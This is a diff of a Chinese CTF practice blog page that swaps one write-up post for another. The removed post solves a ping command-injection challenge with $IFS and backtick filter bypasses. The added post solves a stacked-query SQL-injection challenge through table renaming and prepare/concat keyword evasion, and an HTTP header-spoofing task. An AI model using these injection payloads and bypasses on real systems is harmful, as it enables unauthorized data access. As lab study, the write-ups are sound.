@@ -19,21 +19,22 @@
   <meta name="author" content="aidemofashi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[GXYCTF2019]Ping Ping Ping 1根据提示 1?ip&#x3D;1 根据回复，那就是ping功能了，尝试用管道符连接命令： 1234?ip&#x3D;1|lsflag.phpindex.php 直接就有flag，然后发现过滤了空格和flag,上网查如何绕过空格过滤最后使用$IFS$1 1234567891011121314151617181920?ip&#x3D;1|cat$IFS$1index.php&#x2F;">
+    <meta name="description" content="2019 review-强网杯-随便注再做一遍 12345678910111213141516171819202122231&#x27;show tables#1&#x27;;show tables;#1&#x27;;select group_concat(culumn_name);#return preg_match(&quot;&#x2F;select|update|delete|drop|insert">
 <meta property="og:type" content="article">
-<meta property="og:title" content="note-26">
-<meta property="og:url" content="https://aidemofashi.github.io/2025/04/15/note-26/index.html">
+<meta property="og:title" content="note-27">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/04/17/note-27/index.html">
 <meta property="og:site_name" content="aidemofashi&#39;s blog">
-<meta property="og:description" content="[GXYCTF2019]Ping Ping Ping 1根据提示 1?ip&#x3D;1 根据回复，那就是ping功能了，尝试用管道符连接命令： 1234?ip&#x3D;1|lsflag.phpindex.php 直接就有flag，然后发现过滤了空格和flag,上网查如何绕过空格过滤最后使用$IFS$1 1234567891011121314151617181920?ip&#x3D;1|cat$IFS$1index.php&#x2F;">
+<meta property="og:description" content="2019 review-强网杯-随便注再做一遍 12345678910111213141516171819202122231&#x27;show tables#1&#x27;;show tables;#1&#x27;;select group_concat(culumn_name);#return preg_match(&quot;&#x2F;select|update|delete|drop|insert">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-04-15T14:42:32.000Z">
-<meta property="article:modified_time" content="2025-04-15T15:14:22.996Z">
+<meta property="article:published_time" content="2025-04-17T03:01:54.000Z">
+<meta property="article:modified_time" content="2025-04-17T03:03:09.576Z">
 <meta property="article:author" content="aidemofashi">
+<meta property="article:tag" content="note">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>note-26 - aidemofashi&#39;s blog</title>
+  <title>note-27 - aidemofashi&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="note-26"></span>
+            <span id="subtitle" data-typed-text="note-27"></span>
           
         </div>
 
@@ -210,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-04-15 22:42" pubdate>
-          2025年4月15日 晚上
+        <time datetime="2025-04-17 11:01" pubdate>
+          2025年4月17日 上午
         </time>
       </span>
     
@@ -222,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          207 字
+          561 字
         
       </span>
     
@@ -233,7 +234,7 @@
         
         
         
-          2 分钟
+          5 分钟
         
       </span>
     
@@ -270,20 +271,24 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">note-26</h1>
+            <h1 id="seo-header">note-27</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h1><p>根据提示</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1<br></code></pre></td></tr></table></figure>
-<p>根据回复，那就是ping功能了，<br>尝试用管道符连接命令：</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1|ls<br><br>flag.php<br>index.php<br></code></pre></td></tr></table></figure>
-<p>直接就有flag，然后发现过滤了空格和flag,<br>上网查如何绕过空格过滤<br>最后使用$IFS$1</p>
-<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><span class="hljs-number">1</span>|cat$IFS$<span class="hljs-number">1</span>index.php<br><br><span class="hljs-operator">/</span><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><br>|\&#x27;|\<span class="hljs-string">&quot;|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match))&#123;<br>    echo preg_match(<span class="hljs-string">&quot;/<span class="hljs-char escape_">\&amp;</span>|<span class="hljs-char escape_">\/</span>|<span class="hljs-char escape_">\?</span>|<span class="hljs-char escape_">\*</span>|<span class="hljs-char escape_">\&lt;</span>|[<span class="hljs-char escape_">\x</span>&#123;00&#125;-<span class="hljs-char escape_">\x</span>&#123;20&#125;]|<span class="hljs-char escape_">\&gt;</span>|<span class="hljs-char escape_">\&#x27;</span>|<span class="hljs-char escape_">\&quot;</span>|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match);<br>    die(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  $a <span class="hljs-operator">=</span> shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.$ip);<br>  echo <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>  print_r($a);<br>&#125;<br><br><span class="hljs-operator">?</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
-<p>没坚持下去，去找wp了<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51439282/article/details/113378868">https://blog.csdn.net/qq_51439282/article/details/113378868</a><br>最后选了内联法:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$1</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure>
-<p>记一下<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/angaoux03775/article/details/101710776">https://blog.csdn.net/angaoux03775/article/details/101710776</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52425873/article/details/124899793">https://blog.csdn.net/m0_52425873/article/details/124899793</a></p>
+                <h1 id="2019-review-强网杯-随便注"><a href="#2019-review-强网杯-随便注" class="headerlink" title="2019 review-强网杯-随便注"></a>2019 review-强网杯-随便注</h1><p>再做一遍</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;show tables#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;select group_concat(culumn_name);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br><span class="hljs-string"></span><br><span class="hljs-string">0&#x27;</span>;extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">database</span>()));#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;if(1=1,sleep(5),0);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,version()))  # <br>!<span class="hljs-number">10.3</span><span class="hljs-number">.18</span>-MariaDB<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;or extractvalue(1,concat(&#x27;</span>!<span class="hljs-string">&#x27;,version()))  # </span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">COLUMN</span> flag <span class="hljs-keyword">TO</span> id;#<br>//没改成功，看返回大概是说找不到名为<span class="hljs-string">&#x27;id&#x27;</span>的<span class="hljs-keyword">column</span>,<span class="hljs-keyword">column</span>是行还是列来着？是列我朝<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename table words to words1;ALTER TABLE employees CHANGE flag id VARCHAR(50);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words CHANGE flag id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>);#<br>//成功<br></code></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F;<br>&#x2F;&#x2F;</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">语句背景分析：<br>这段 SQL 包含多个操作，核心目的是：<br><br>将表 <span class="hljs-built_in">words</span> 重命名为 words1。<br><br>将表 <span class="hljs-number">1919810931114514</span> 重命名为 <span class="hljs-built_in">words</span>。<br><br>修改新表 <span class="hljs-built_in">words</span> 的字段 flag，将其重命名为 <span class="hljs-built_in">id</span>，并更改其数据类型为 varchar(<span class="hljs-number">50</span>)。<br></code></pre></td></tr></table></figure>
+<p>想不起当初的做题笔记了，只是看到正则的情况想到了改表明和列明，应该只是单纯的想起，因为连列名都忘了查</p>
+<p>当时还记了其它绕过方法，<br>试一下预编译绕过</p>
+<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables name;</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;show columns from `<span class="hljs-number">1919810931114514</span>`;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">6</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;flag&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;varchar(100)&quot;</span><br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;NO&quot;</span><br>  [<span class="hljs-number">3</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  [<span class="hljs-number">4</span>]=&gt;<br>  NULL<br>  [<span class="hljs-number">5</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
+<p>1’;prepare hack from concat(‘sele’,’ct’,’* from <code>1919810931114514</code>‘);exectue hack;@<br>&#x2F;&#x2F;不是，明明一模一样，为啥我手敲的执行不了<br>&#x2F;&#x2F;1’;prepare hack from concat(‘sele’,’ct’,’* from  <code>1919810931114514</code>‘);execute hack;#<br>&#x2F;&#x2F;woc，原来是excute</p>
+<p>1’;prepare hack from concat(‘sele’,’ct’,’* from <code>1919810931114514</code>‘);execute hack;@</p>
+<h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>根据提示<br>f12 搜索secret，找到：<br><a target="_blank" rel="noopener" href="http://node5.buuoj.cn:27381/Secret.php">http://node5.buuoj.cn:27381/Secret.php</a><br>然后就是根据提示改请求头，  </p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Access-Control-Allow-Origin:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">From:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-symbol">//Please</span> use <span class="hljs-string">&quot;Syclover&quot;</span> browser<br><br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">Browser :</span> Syclover<br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">User-Agent:</span> Syclover<br><br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Syclover Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-operator">//</span>No<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span> you can only read this locally<span class="hljs-operator">!</span><span class="hljs-operator">!</span><span class="hljs-operator">!</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">From :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br><span class="hljs-params">User-Agent:</span>  Syclover (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit<span class="hljs-symbol">/537.36</span> (KHTML, like Gecko) Chrome<span class="hljs-symbol">/129.0.6668.71</span> Safari<span class="hljs-symbol">/537.36</span><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-params">X-Forwarded-For :</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-operator">//</span>flag&#123;<span class="hljs-number">41</span>cea244-<span class="hljs-number">340</span>a-<span class="hljs-number">4</span>be9-bd6e-ba42db379119&#125;<br></code></pre></td></tr></table></figure>
+<p>有点当初BuildCTF里的一题，但是那道题要改的更多</p>
 
                 
               </div>
@@ -293,6 +298,13 @@
               <div class="post-metas my-3">
   
   
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/note/" class="print-no-link">#note</a>
+      
+    </div>
+  
 </div>
 
 
@@ -301,8 +313,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>note-26</div>
-      <div>https://aidemofashi.github.io/2025/04/15/note-26/</div>
+      <div>note-27</div>
+      <div>https://aidemofashi.github.io/2025/04/17/note-27/</div>
     </div>
     <div class="license-meta">
       
@@ -314,7 +326,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年4月15日</div>
+          <div>2025年4月17日</div>
         </div>
       
       
@@ -346,18 +358,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/04/17/note-27/" title="note-27">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">note-27</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/04/15/note-25/" title="note-25">
-                        <span class="hidden-mobile">note-25</span>
+                      <a href="/2025/04/15/note-26/" title="note-26">
+                        <span class="hidden-mobile">note-26</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
